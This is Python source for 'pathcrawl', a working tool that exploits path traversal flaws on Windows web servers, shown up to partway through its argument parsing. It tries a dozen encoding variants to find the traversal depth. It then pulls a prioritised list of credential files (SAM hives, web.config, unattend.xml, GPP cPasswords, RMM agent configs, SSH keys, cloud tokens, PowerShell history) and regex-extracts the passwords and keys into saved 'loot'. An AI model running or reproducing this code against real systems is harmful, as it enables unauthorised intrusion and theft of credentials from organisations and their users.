#!/usr/bin/env python3 -I
"""pathcrawl - Windows-aware path traversal exploitation tool.

Discovers traversal depth and encoding, then systematically pulls
high-value Windows files through the vulnerability. Gentle threading
to avoid killing the target application.
"""

import argparse
import base64
import concurrent.futures
import json
import os
import re
import signal
import sys
import threading
import time
import urllib.parse
from collections import defaultdict
from dataclasses import dataclass, field

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── colour helpers ──────────────────────────────────────────────────

NO_COLOUR = False

def _c(code, text):
    if NO_COLOUR:
        return text
    return f"\033[{code}m{text}\033[0m"

def red(t):    return _c("91", t)
def green(t):  return _c("92", t)
def yellow(t): return _c("93", t)
def blue(t):   return _c("94", t)
def cyan(t):   return _c("96", t)
def dim(t):    return _c("90", t)
def bold(t):   return _c("1", t)

# ── banner ──────────────────────────────────────────────────────────

BANNER = r"""
             __  __                          __
    ____    / /_/ /_  ______________ __      / /
   / __ \  / __/ __ \/ ___/ ___/ __ `/ | /| / /
  / /_/ / / /_/ / / / /__/ /  / /_/ /| |/ |/ / /  /
 / .___/  \__/_/ /_/\___/_/   \__,_/ |__/|__/ (__/
/_/
         windows path traversal exploiter
"""

# ── traversal encodings ────────────────────────────────────────────

ENCODINGS = {
    "plain-fwd":       ("../",  "/"),
    "plain-back":      ("..\\", "\\"),
    "url-dot":         ("%2e%2e/", "/"),
    "url-slash":       ("../%2f", "/"),
    "url-back":        ("..%5c", "\\"),
    "double-url-dot":  ("%252e%252e/", "/"),
    "double-url-back": ("..%255c", "\\"),
    "overlong-utf8-2": ("..%c0%af", "/"),
    "overlong-utf8-3": ("..%ef%bc%8f", "/"),
    "mixed-1":         ("..\\/", "/"),
    "mixed-2":         ("../\\", "\\"),
    "null-byte":       ("../", "/", "\x00"),
}

def build_traversal(encoding_key, depth, filepath):
    """Build the traversal string for a given encoding, depth, and target file."""
    enc = ENCODINGS[encoding_key]
    seq = enc[0] * depth
    sep = enc[1]
    winpath = filepath.replace("\\", sep).replace("/", sep)
    if winpath.startswith(sep):
        winpath = winpath.lstrip(sep)
    payload = seq + winpath
    if len(enc) == 3:
        payload += enc[2]
    return payload

# ── windows file target database ───────────────────────────────────

@dataclass
class FileTarget:
    path: str
    category: str
    description: str
    stack: str = "any"           # any | iis | iis6 | dotnet | dotnet-core
    parse_fn: str = ""           # name of extraction function
    priority: int = 2            # 1=critical, 2=high, 3=medium, 4=low

TARGETS = [
    # ── depth/encoding probe files ──
    FileTarget("Windows/win.ini", "probe", "Depth detection probe", priority=0),
    FileTarget("Windows/System32/drivers/etc/hosts", "probe", "Depth detection probe (hosts)", priority=0),

    # ── credential files ──
    FileTarget("Windows/System32/config/SAM", "creds", "SAM database (needs SYSTEM priv)", priority=1),
    FileTarget("Windows/System32/config/SYSTEM", "creds", "SYSTEM hive (needs SYSTEM priv)", priority=1),
    FileTarget("Windows/System32/config/SECURITY", "creds", "SECURITY hive (needs SYSTEM priv)", priority=1),
    FileTarget("inetpub/wwwroot/web.config", "creds", "IIS web.config - connection strings / machineKey", stack="iis", parse_fn="parse_webconfig", priority=1),
    FileTarget("inetpub/wwwroot/Web.config", "creds", "IIS Web.config (case variant)", stack="iis", parse_fn="parse_webconfig", priority=1),
    FileTarget("Windows/Microsoft.NET/Framework64/v4.0.30319/Config/web.config", "creds", ".NET global web.config", stack="dotnet", parse_fn="parse_webconfig", priority=1),
    FileTarget("Windows/Microsoft.NET/Framework/v4.0.30319/Config/web.config", "creds", ".NET global web.config (32-bit)", stack="dotnet", parse_fn="parse_webconfig", priority=1),
    FileTarget("Windows/System32/inetsrv/config/applicationHost.config", "creds", "IIS applicationHost.config", stack="iis", parse_fn="parse_webconfig", priority=1),
    FileTarget("Windows/System32/inetsrv/config/administration.config", "creds", "IIS administration.config", stack="iis", parse_fn="parse_webconfig", priority=1),
    FileTarget("Windows/Panther/unattend.xml", "creds", "Unattend setup - may contain plaintext/b64 passwords", parse_fn="parse_unattend", priority=1),
    FileTarget("Windows/Panther/Unattend/unattend.xml", "creds", "Unattend (alternate path)", parse_fn="parse_unattend", priority=1),
    FileTarget("Windows/Panther/unattended.xml", "creds", "Unattended setup variant", parse_fn="parse_unattend", priority=1),
    FileTarget("Windows/System32/sysprep/unattend.xml", "creds", "Sysprep unattend", parse_fn="parse_unattend", priority=1),
    FileTarget("Windows/System32/sysprep/Panther/unattend.xml", "creds", "Sysprep Panther unattend", parse_fn="parse_unattend", priority=1),

    # ── RMM / agent configs ──
    FileTarget("Program Files (x86)/N-able Technologies/Windows Agent/config/ApplianceConfig.xml", "creds", "N-Able RMM agent config - server URL / keys", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files (x86)/N-Able Technologies/Windows Agent/config/ApplianceConfig.xml", "creds", "N-Able RMM (alt capitalisation)", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files/N-able Technologies/Windows Agent/config/ApplianceConfig.xml", "creds", "N-Able RMM (64-bit path)", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files (x86)/BeAnywhere Support Express/GetSupportService_N-Central/BASupSrvcCnfg.ini", "creds", "N-Able BeAnywhere config", priority=1),
    FileTarget("Program Files (x86)/Solarwinds/N-able Technologies/Windows Agent/config/ApplianceConfig.xml", "creds", "SolarWinds N-Able agent config", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files (x86)/ConnectWise/ConnectWise Control/app.config", "creds", "ConnectWise Control config", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files (x86)/ScreenConnect Client/app.config", "creds", "ScreenConnect client config", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files/Datto/Datto Windows Agent/config/agent.config", "creds", "Datto RMM agent config", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files (x86)/Kaseya/KWORKING/KaseyaD.ini", "creds", "Kaseya agent config", priority=1),
    FileTarget("Program Files (x86)/Kaseya/KWORKING/endpoint.ini", "creds", "Kaseya agent endpoint", priority=1),
    FileTarget("Program Files/Huntress/HuntressAgent.ini", "creds", "Huntress agent config", priority=1),
    FileTarget("Program Files/NinjaRMMAgent/NinjaRMMAgent.ini", "creds", "NinjaRMM agent config", priority=1),
    FileTarget("Program Files (x86)/NinjaRMMAgent/NinjaRMMAgent.ini", "creds", "NinjaRMM agent config (x86)", priority=1),
    FileTarget("Program Files/Atera Networks/AteraAgent/AteraAgent.exe.config", "creds", "Atera agent config", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Program Files/SentinelOne/Sentinel Agent/config/config.json", "creds", "SentinelOne agent config", priority=1),
    FileTarget("ProgramData/Microsoft/Group Policy/History/Machine/Preferences/Groups/Groups.xml", "creds", "GPP cached Groups.xml (cPassword)", parse_fn="parse_gpp", priority=1),
    FileTarget("ProgramData/Microsoft/Group Policy/History/Machine/Preferences/Datasources/Datasources.xml", "creds", "GPP cached Datasources", parse_fn="parse_gpp", priority=1),
    FileTarget("ProgramData/Microsoft/Group Policy/History/Machine/Preferences/Services/Services.xml", "creds", "GPP cached Services", parse_fn="parse_gpp", priority=1),
    FileTarget("ProgramData/Microsoft/Group Policy/History/Machine/Preferences/ScheduledTasks/ScheduledTasks.xml", "creds", "GPP cached ScheduledTasks", parse_fn="parse_gpp", priority=1),

    # ── saved credentials / sessions ──
    FileTarget("Windows/System32/config/systemprofile/.gitconfig", "creds", "SYSTEM git config - may have credentials", priority=2),
    FileTarget("ProgramData/FileZilla Server/FileZilla Server.xml", "creds", "FileZilla Server config (cleartext passwords)", parse_fn="parse_xml_creds", priority=1),

    # ── IIS / web stack recon ──
    FileTarget("inetpub/logs/LogFiles/W3SVC1/u_ex{date}.log", "recon", "IIS access log (template, needs date)", stack="iis", priority=3),
    FileTarget("Windows/System32/LogFiles/HTTPERR/httperr1.log", "recon", "HTTP.sys error log - internal URLs / IPs", priority=2),
    FileTarget("inetpub/wwwroot/global.asax", "recon", "ASP.NET global.asax", stack="dotnet", priority=3),

    # ── system recon ──
    FileTarget("Windows/System32/drivers/etc/hosts", "recon", "Hosts file - internal hostnames", parse_fn="parse_hosts", priority=1),
    FileTarget("Windows/System32/drivers/etc/networks", "recon", "Networks file", priority=3),
    FileTarget("Windows/System32/drivers/etc/lmhosts.sam", "recon", "LMHOSTS sample - sometimes customised", priority=3),
    FileTarget("Windows/debug/NetSetup.LOG", "recon", "Domain join log - domain/DC names", parse_fn="parse_netsetup", priority=1),
    FileTarget("Windows/System32/config/software", "recon", "SOFTWARE hive (large, needs SYSTEM priv)", priority=3),
    FileTarget("Windows/win.ini", "recon", "win.ini - minimal but confirms read", priority=2),
    FileTarget("Windows/System.ini", "recon", "system.ini", priority=3),
    FileTarget("Windows/iis.log", "recon", "Legacy IIS log", stack="iis", priority=4),
    FileTarget("Windows/System32/License/ServerLicensingStatus.xml", "recon", "License status - OS edition", priority=3),
    FileTarget("Windows/System32/WindowsPowerShell/v1.0/profile.ps1", "recon", "System-wide PS profile", priority=2),

    # ── user enumeration (template paths filled at runtime) ──
    FileTarget("Users/{user}/Desktop/desktop.ini", "user-enum", "User home probe", priority=2),
    FileTarget("Users/{user}/.gitconfig", "creds", "User git config", priority=2),
    FileTarget("Users/{user}/AppData/Roaming/FileZilla/recentservers.xml", "creds", "FileZilla saved servers", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Users/{user}/AppData/Roaming/FileZilla/sitemanager.xml", "creds", "FileZilla site manager", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Users/{user}/.ssh/id_rsa", "creds", "SSH private key", priority=1),
    FileTarget("Users/{user}/.ssh/id_ed25519", "creds", "SSH ED25519 private key", priority=1),
    FileTarget("Users/{user}/.ssh/known_hosts", "recon", "SSH known hosts", priority=2),
    FileTarget("Users/{user}/.ssh/config", "recon", "SSH client config", priority=2),
    FileTarget("Users/{user}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt", "creds", "PowerShell history", parse_fn="parse_ps_history", priority=1),
    FileTarget("Users/{user}/AppData/Local/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt", "creds", "PowerShell history (Local)", parse_fn="parse_ps_history", priority=1),
    FileTarget("Users/{user}/.aws/credentials", "creds", "AWS credentials", priority=1),
    FileTarget("Users/{user}/.azure/accessTokens.json", "creds", "Azure cached tokens", priority=1),
    FileTarget("Users/{user}/AppData/Roaming/gcloud/credentials.db", "creds", "GCP credentials db", priority=1),
    FileTarget("Users/{user}/AppData/Roaming/gcloud/access_tokens.db", "creds", "GCP access tokens", priority=1),
    FileTarget("Users/{user}/.kube/config", "creds", "Kubernetes config", priority=1),
    FileTarget("Users/{user}/AppData/Local/Microsoft/Credentials/", "creds", "DPAPI credential store", priority=2),
    FileTarget("Users/{user}/AppData/Roaming/Microsoft/Protect/", "creds", "DPAPI master keys", priority=2),
    FileTarget("Users/{user}/NTUSER.DAT", "recon", "User registry hive (large)", priority=3),
    FileTarget("Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data", "creds", "Edge saved passwords (encrypted)", priority=2),
    FileTarget("Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "creds", "Chrome saved passwords (encrypted)", priority=2),
    FileTarget("Users/{user}/AppData/Roaming/mRemoteNG/confCons.xml", "creds", "mRemoteNG connections (encrypted)", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Users/{user}/Documents/mRemoteNG/confCons.xml", "creds", "mRemoteNG connections (Documents)", parse_fn="parse_xml_creds", priority=1),
    FileTarget("Users/{user}/.vnc/passwd", "creds", "VNC password file", priority=1),
    FileTarget("Users/{user}/AppData/Local/Packages/Microsoft.WindowsTerminal_8wekyb3d8bbwe/LocalState/settings.json", "recon", "Windows Terminal settings", priority=4),

    # ── IIS virtual directory discovery ──
    FileTarget("inetpub/wwwroot/aspnet_client/system_web/", "recon", "ASP.NET client scripts dir", stack="iis", priority=3),

    # ── .NET machineKey for deserialization ──
    FileTarget("Windows/Microsoft.NET/Framework64/v4.0.30319/Config/machine.config", "creds", ".NET machine.config (machineKey)", stack="dotnet", parse_fn="parse_machinekey", priority=1),
    FileTarget("Windows/Microsoft.NET/Framework/v4.0.30319/Config/machine.config", "creds", ".NET machine.config 32-bit", stack="dotnet", parse_fn="parse_machinekey", priority=1),
    FileTarget("Windows/Microsoft.NET/Framework64/v2.0.50727/Config/machine.config", "creds", ".NET 2.0 machine.config", stack="dotnet", parse_fn="parse_machinekey", priority=1),
    FileTarget("Windows/Microsoft.NET/Framework/v2.0.50727/Config/machine.config", "creds", ".NET 2.0 machine.config 32-bit", stack="dotnet", parse_fn="parse_machinekey", priority=1),
]

DEFAULT_USERS = [
    "Administrator", "Default", "Public",
    "svc_iis", "svc_sql", "svc_web", "svc_app",
    "webadmin", "admin", "user",
]

# ── content extractors ─────────────────────────────────────────────

def parse_webconfig(body):
    findings = []
    for m in re.finditer(r'connectionString\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"Connection string: {m.group(1)}")
    for m in re.finditer(r'<machineKey[^>]*validationKey\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"machineKey validationKey: {m.group(1)[:32]}...")
    for m in re.finditer(r'<machineKey[^>]*decryptionKey\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"machineKey decryptionKey: {m.group(1)[:32]}...")
    for m in re.finditer(r'password\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"Password value: {m.group(1)}")
    for m in re.finditer(r'<identity[^>]*password\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"App pool identity password: {m.group(1)}")
    for m in re.finditer(r'userName\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"Username: {m.group(1)}")
    return findings

def parse_unattend(body):
    findings = []
    for m in re.finditer(r'<Password>.*?<Value>([^<]+)</Value>', body, re.DOTALL | re.IGNORECASE):
        raw = m.group(1).strip()
        try:
            decoded = base64.b64decode(raw).decode("utf-16-le", errors="replace").rstrip("\x00")
            findings.append(f"Unattend password (decoded): {decoded}")
        except Exception:
            findings.append(f"Unattend password (raw): {raw}")
    for m in re.finditer(r'<Username>([^<]+)</Username>', body, re.IGNORECASE):
        findings.append(f"Unattend username: {m.group(1)}")
    for m in re.finditer(r'<AutoLogon>.*?</AutoLogon>', body, re.DOTALL | re.IGNORECASE):
        findings.append(f"AutoLogon block found")
    return findings

def parse_gpp(body):
    findings = []
    for m in re.finditer(r'cpassword\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"GPP cPassword (decrypt with gpp-decrypt): {m.group(1)}")
    for m in re.finditer(r'userName\s*=\s*"([^"]+)"', body, re.IGNORECASE):
        findings.append(f"GPP username: {m.group(1)}")
    return findings

def parse_hosts(body):
    findings = []
    for line in body.splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            findings.append(f"Host entry: {line}")
    return findings

def parse_netsetup(body):
    findings = []
    for m in re.finditer(r'NetpDoDomainJoin.*?DnsDomainName:\s*(\S+)', body, re.IGNORECASE):
        findings.append(f"Domain: {m.group(1)}")
    for m in re.finditer(r'NetpDoDomainJoin.*?DomainControllerName:\s*(\S+)', body, re.IGNORECASE):
        findings.append(f"Domain Controller: {m.group(1)}")
    for m in re.finditer(r'NetpDoDomainJoin.*?SiteName:\s*(\S+)', body, re.IGNORECASE):
        findings.append(f"Site: {m.group(1)}")
    if not findings:
        for m in re.finditer(r'(NetpDoDomainJoin|NetpJoinDomain|DnsDomain|SiteName)[^\n]*', body, re.IGNORECASE):
            findings.append(m.group(0).strip())
    return findings

def parse_ps_history(body):
    findings = []
    interesting = re.compile(
        r'(password|secret|key|token|credential|invoke-|net\s+user|runas|'
        r'convertto-securestring|new-pscredential|set-item.*wsman|'
        r'enter-pssession|new-pssession|connect-|sqlcmd|invoke-sqlcmd)',
        re.IGNORECASE,
    )
    for line in body.splitlines():
        line = line.strip()
        if line and interesting.search(line):
            findings.append(f"Interesting cmd: {line}")
    return findings

def parse_xml_creds(body):
    findings = []
    for m in re.finditer(r'(?:password|passwd|pwd|secret|key|token|apikey|api_key)\s*[=:]\s*"?([^\s"<>]+)', body, re.IGNORECASE):
        findings.append(f"Credential value: {m.group(0).strip()}")
    for m in re.finditer(r'<(Server|Host|Hostname|URL|Endpoint|Address)>([^<]+)</', body, re.IGNORECASE):
        findings.append(f"{m.group(1)}: {m.group(2)}")
    return findings

def parse_machinekey(body):
    findings = []
    for m in re.finditer(r'<machineKey[^>]*>', body, re.IGNORECASE):
        block = m.group(0)
        vk = re.search(r'validationKey\s*=\s*"([^"]+)"', block, re.IGNORECASE)
        dk = re.search(r'decryptionKey\s*=\s*"([^"]+)"', block, re.IGNORECASE)
        if vk:
            findings.append(f"validationKey: {vk.group(1)}")
        if dk:
            findings.append(f"decryptionKey: {dk.group(1)}")
    return findings

PARSERS = {
    "parse_webconfig": parse_webconfig,
    "parse_unattend": parse_unattend,
    "parse_gpp": parse_gpp,
    "parse_hosts": parse_hosts,
    "parse_netsetup": parse_netsetup,
    "parse_ps_history": parse_ps_history,
    "parse_xml_creds": parse_xml_creds,
    "parse_machinekey": parse_machinekey,
}

# ── result types ───────────────────────────────────────────────────

@dataclass
class HitResult:
    target: FileTarget
    status_code: int
    content_length: int
    body: str
    extracted: list = field(default_factory=list)
    traversal_used: str = ""
    depth: int = 0

# ── core engine ────────────────────────────────────────────────────

class PathCrawl:
    def __init__(self, args):
        self.base_url = args.url.rstrip("/")
        self.param = args.param
        self.method = args.method.upper()
        self.body_param = args.body_param
        self.path_mode = self.param is None
        if self.path_mode and "FUZZ" in self.base_url:
            self.fuzz_marker = True
        else:
            self.fuzz_marker = False
        self.headers = self._parse_headers(args.header)
        self.cookies = self._parse_cookies(args.cookie)
        self.proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
        self.verify_ssl = not args.no_ssl
        self.timeout = args.timeout
        self.threads = args.threads
        self.delay = args.delay
        self.max_depth = args.max_depth
        self.users = args.users.split(",") if args.users else DEFAULT_USERS
        self.extra_users = []
        self.output_file = args.output
        self.json_output = args.json
        self.verbose = args.verbose
        self.stack = args.stack
        self.categories = set(args.categories.split(",")) if args.categories else None
        self.custom_files = args.file
        self.save_dir = args.save_dir

        self.working_encoding = None
        self.working_depth = None
        self.hits = []
        self.tested = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.verify = self.verify_ssl
        if self.proxy:
            self.session.proxies = self.proxy
        if self.cookies:
            self.session.cookies.update(self.cookies)

        self.baseline_length = None
        self.baseline_status = None

    def _parse_headers(self, header_list):
        headers = {}
        if header_list:
            for h in header_list:
                if ":" in h:
                    k, v = h.split(":", 1)
                    headers[k.strip()] = v.strip()
        return headers

    def _parse_cookies(self, cookie_str):
        cookies = {}
        if cookie_str:
            for pair in cookie_str.split(";"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    cookies[k.strip()] = v.strip()
        return cookies

    def _send(self, payload):
        """Send a single traversal request and return (status, body)."""
        try:
            if self.path_mode:
                if self.fuzz_marker:
                    url = self.base_url.replace("FUZZ", payload)
                else:
                    url = self.base_url + "/" + payload
                resp = self.session.get(
                    url, headers=self.headers, timeout=self.timeout, allow_redirects=False
                )
            elif self.method == "GET":
                parsed = urllib.parse.urlparse(self.base_url)
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                qs[self.param] = [payload]
                new_query = urllib.parse.urlencode(qs, doseq=True)
                url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                resp = self.session.get(
                    url, headers=self.headers, timeout=self.timeout, allow_redirects=False
                )
            else:
                pname = self.body_param or self.param
                data = {pname: payload}
                resp = self.session.post(
                    self.base_url, data=data, headers=self.headers,
                    timeout=self.timeout, allow_redirects=False
                )
            return resp.status_code, resp.text
        except requests.RequestException as e:
            if self.verbose:
                print(dim(f"  [!] Request error: {e}"))
            return None, None

    def _baseline(self):
        """Establish a baseline response for comparison."""
        print(dim("  [*] Establishing baseline response..."))
        payload = "nonexistent_pathcrawl_baseline_file.txt"
        status, body = self._send(payload)
        if status is not None:
            self.baseline_status = status
            self.baseline_length = len(body) if body else 0
            print(dim(f"  [*] Baseline: status={status} length={self.baseline_length}"))

    def _is_hit(self, status, body):
        """Determine if a response is a genuine hit vs. baseline/error."""
        if status is None or body is None:
            return False
        if status in (404, 500, 502, 503):
            return False
        blen = len(body)
        if self.baseline_length is not None:
            if status == self.baseline_status and abs(blen - self.baseline_length) < 16:
                return False
        if blen < 4:
            return False
        lowbody = body[:256].lower()
        error_sigs = [
            "file not found", "404", "not found", "error occurred",
            "cannot find", "does not exist", "access denied",
            "access is denied", "unauthorized",
        ]
        for sig in error_sigs:
            if sig in lowbody:
                return False
        return True

    def detect_traversal(self):
        """Auto-detect working encoding and depth."""
        print(bold("\n[1] Detecting traversal depth and encoding\n"))
        self._baseline()

        probe_files = ["Windows/win.ini", "Windows/System32/drivers/etc/hosts"]
        found = False

        for enc_key in ENCODINGS:
            if found:
                break
            for depth in range(1, self.max_depth + 1):
                for pf in probe_files:
                    payload = build_traversal(enc_key, depth, pf)
                    if self.verbose:
                        print(dim(f"  Trying {enc_key} depth={depth} file={pf}"))
                    status, body = self._send(payload)
                    if self._is_hit(status, body):
                        known_sigs = [
                            "[fonts]", "[extensions]", "[mci extensions]",
                            "localhost", "127.0.0.1",
                        ]
                        if any(s in (body or "").lower() for s in known_sigs):
                            self.working_encoding = enc_key
                            self.working_depth = depth
                            found = True
                            print(green(f"  [+] Hit! encoding={enc_key} depth={depth}"))
                            print(dim(f"      Probe: {pf}"))
                            print(dim(f"      Status: {status}, Length: {len(body)}"))
                            break
                if found:
                    break
            time.sleep(self.delay)

        if not found:
            print(red("  [-] Could not detect traversal. Try --max-depth or manual --encoding/--depth."))
            return False

        print(green(f"\n  [+] Traversal confirmed: {self.working_encoding} × depth {self.working_depth}\n"))
        return True

    def _expand_targets(self):
        """Expand template targets with discovered/configured users."""
        all_users = list(set(self.users + self.extra_users))
        expanded = []
        for t in TARGETS:
            if t.priority == 0:
                continue
            if self.categories and t.category not in self.categories:
                continue
            if self.stack != "any" and t.stack not in ("any", self.stack):
                continue
            if "{user}" in t.path:
                for user in all_users:
                    expanded.append(FileTarget(
                        path=t.path.replace("{user}", user),
                        category=t.category,
                        description=f"{t.description} ({user})",
                        stack=t.stack,
                        parse_fn=t.parse_fn,
                        priority=t.priority,
                    ))
            else:
                expanded.append(t)

        if self.custom_files:
            for cf in self.custom_files:
                cf_clean = cf.replace("\\", "/")
                if cf_clean.startswith("C:/"):
                    cf_clean = cf_clean[3:]
                elif cf_clean.startswith("C:\\"):
                    cf_clean = cf_clean[3:]
                expanded.append(FileTarget(
                    path=cf_clean,
                    category="custom",
                    description=f"Custom: {cf}",
                    priority=1,
                ))

        expanded.sort(key=lambda t: t.priority)
        return expanded

    def _fetch_target(self, target):
        """Fetch a single target file."""
        payload = build_traversal(self.working_encoding, self.working_depth, target.path)
        status, body = self._send(payload)

        with self.lock:
            self.tested += 1

        if self._is_hit(status, body):
            extracted = []
            if target.parse_fn and target.parse_fn in PARSERS:
                extracted = PARSERS[target.parse_fn](body)

            hit = HitResult(
                target=target,
                status_code=status,
                content_length=len(body),
                body=body,
                extracted=extracted,
                traversal_used=self.working_encoding,
                depth=self.working_depth,
            )

            with self.lock:
                self.hits.append(hit)

            if target.category == "user-enum":
                m = re.search(r'Users/([^/]+)/', target.path)
                if m:
                    found_user = m.group(1)
                    if found_user not in self.users and found_user not in self.extra_users:
                        with self.lock:
                            self.extra_users.append(found_user)

            return hit

        time.sleep(self.delay)
        return None

    def _discover_users(self):
        """Quick pass to discover valid user directories."""
        print(bold("[2] Enumerating user directories\n"))
        all_candidates = list(set(self.users + self.extra_users))
        confirmed = []

        for user in all_candidates:
            probe_path = f"Users/{user}/Desktop/desktop.ini"
            payload = build_traversal(self.working_encoding, self.working_depth, probe_path)
            status, body = self._send(payload)
            if self._is_hit(status, body):
                confirmed.append(user)
                print(green(f"  [+] User confirmed: {user}"))
            time.sleep(self.delay)

        if confirmed:
            self.users = confirmed
            print(green(f"\n  [+] {len(confirmed)} user(s) confirmed\n"))
        else:
            print(yellow("  [*] No users confirmed via desktop.ini, using defaults\n"))

    def _save_file(self, hit):
        """Save a retrieved file to disk."""
        if not self.save_dir:
            return
        safe_name = hit.target.path.replace("/", "_").replace("\\", "_").replace(" ", "_")
        path = os.path.join(self.save_dir, safe_name)
        with open(path, "w", encoding="utf-8", errors="replace") as f:
            f.write(hit.body)
        return path

    def exploit(self):
        """Main exploitation loop — fetch all targets with controlled threading."""
        targets = self._expand_targets()
        total = len(targets)
        print(bold(f"[3] Pulling {total} target files ({self.threads} threads, {self.delay}s delay)\n"))

        if self.save_dir:
            os.makedirs(self.save_dir, exist_ok=True)
            print(dim(f"  [*] Saving retrieved files to {self.save_dir}/\n"))

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {}
            for t in targets:
                f = pool.submit(self._fetch_target, t)
                futures[f] = t

            for f in concurrent.futures.as_completed(futures):
                hit = f.result()
                if hit:
                    cat_colour = green if hit.target.category == "creds" else cyan
                    print(cat_colour(f"  [+] {hit.target.category.upper():10s} {hit.target.path}"))
                    print(dim(f"      {hit.target.description} ({hit.content_length} bytes)"))
                    for ext in hit.extracted:
                        print(yellow(f"      >> {ext}"))
                    if self.save_dir:
                        saved = self._save_file(hit)
                        if saved:
                            print(dim(f"      Saved: {saved}"))

        print(dim(f"\n  [*] Tested {self.tested}/{total} files"))

    def _format_console_report(self):
        """Format the final console report."""
        lines = []
        lines.append("")
        lines.append(bold("=" * 64))
        lines.append(bold("  RESULTS SUMMARY"))
        lines.append(bold("=" * 64))
        lines.append("")
        lines.append(f"  Target:    {self.base_url}")
        if self.path_mode:
            mode_str = "FUZZ marker" if self.fuzz_marker else "append to path"
            lines.append(f"  Mode:      path-based ({mode_str})")
        else:
            lines.append(f"  Parameter: {self.param}")
        lines.append(f"  Encoding:  {self.working_encoding}")
        lines.append(f"  Depth:     {self.working_depth}")
        lines.append(f"  Files hit: {len(self.hits)}/{self.tested}")
        lines.append("")

        by_cat = defaultdict(list)
        for h in self.hits:
            by_cat[h.target.category].append(h)

        category_order = ["creds", "custom", "recon", "user-enum"]
        for cat in category_order:
            hits = by_cat.get(cat, [])
            if not hits:
                continue
            label = {"creds": "CREDENTIALS / SECRETS", "recon": "RECONNAISSANCE",
                     "user-enum": "USER ENUMERATION", "custom": "CUSTOM FILES"}.get(cat, cat.upper())
            lines.append(bold(f"  ── {label} ({len(hits)}) ──"))
            lines.append("")
            for h in hits:
                lines.append(f"  {h.target.path}")
                lines.append(dim(f"    {h.target.description} | {h.content_length} bytes"))
                for ext in h.extracted:
                    lines.append(yellow(f"    >> {ext}"))
                lines.append("")

        all_extracted = []
        for h in self.hits:
            all_extracted.extend(h.extracted)
        if all_extracted:
            lines.append(bold("  ── EXTRACTED VALUES ──"))
            lines.append("")
            for ext in all_extracted:
                lines.append(f"    {ext}")
            lines.append("")

        lines.append(bold("=" * 64))
        return "\n".join(lines)

    def _to_json(self):
        """Generate JSON report."""
        data = {
            "target": self.base_url,
            "mode": "path" if self.path_mode else "param",
            "parameter": self.param,
            "encoding": self.working_encoding,
            "depth": self.working_depth,
            "total_tested": self.tested,
            "total_hits": len(self.hits),
            "hits": [],
        }
        for h in self.hits:
            data["hits"].append({
                "path": h.target.path,
                "category": h.target.category,
                "description": h.target.description,
                "status_code": h.status_code,
                "content_length": h.content_length,
                "extracted": h.extracted,
            })
        return json.dumps(data, indent=2)

    def report(self):
        """Print and optionally save the report."""
        console_report = self._format_console_report()
        print(console_report)

        if self.output_file:
            if self.json_output:
                content = self._to_json()
            else:
                if NO_COLOUR:
                    content = console_report
                else:
                    content = re.sub(r'\033\[[0-9;]*m', '', console_report)
            with open(self.output_file, "w") as f:
                f.write(content)
            print(green(f"\n  [+] Report saved to {self.output_file}"))

    def run(self):
        print(cyan(BANNER))
        if not self.detect_traversal():
            if self.working_encoding is None and hasattr(self, '_forced_encoding'):
                pass
            else:
                sys.exit(1)
        self._discover_users()
        self.exploit()
        self.report()


def main():
    global NO_COLOUR

    parser = argparse.ArgumentParser(
        description="pathcrawl — Windows path traversal exploitation tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  # Path-based (no parameter, traversal in URL path):
  %(prog)s -u "http://target/images/"
  %(prog)s -u "http://target/static/FUZZ" --encoding plain-fwd --depth 8

  # Parameter-based (traversal in query/body param):
  %(prog)s -u "http://target/vuln.asp?file=test" -p file
  %(prog)s -u "http://target/api/read" -p path -m POST --threads 3
  %(prog)s -u "http://target/vuln?f=x" -p f --encoding plain-fwd --depth 6
  %(prog)s -u "http://target/vuln?f=x" -p f --users admin,svc_web -o report.json --json
  %(prog)s -u "http://target/vuln?f=x" -p f --file "C:\\custom\\path.conf" --save-dir loot/
"""
    )

    parser.add_argument("-u", "--url", required=True,
                        help="Target URL. Path mode: bare URL or use FUZZ marker. Param mode: use with -p")
    parser.add_argument("-p", "--param", default=None,
                        help="Vulnerable parameter name (omit for path-based traversal)")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("--body-param", help="Body parameter name if different from -p (POST only)")
    parser.add_argument("-H", "--header", action="append", help="Custom header (e.g. 'Authorization: Bearer xxx')")
    parser.add_argument("-C", "--cookie", help="Cookies (e.g. 'session=abc; token=xyz')")
    parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL verification")
    parser.add_argument("--timeout", type=float, default=10, help="Request timeout in seconds (default: 10)")
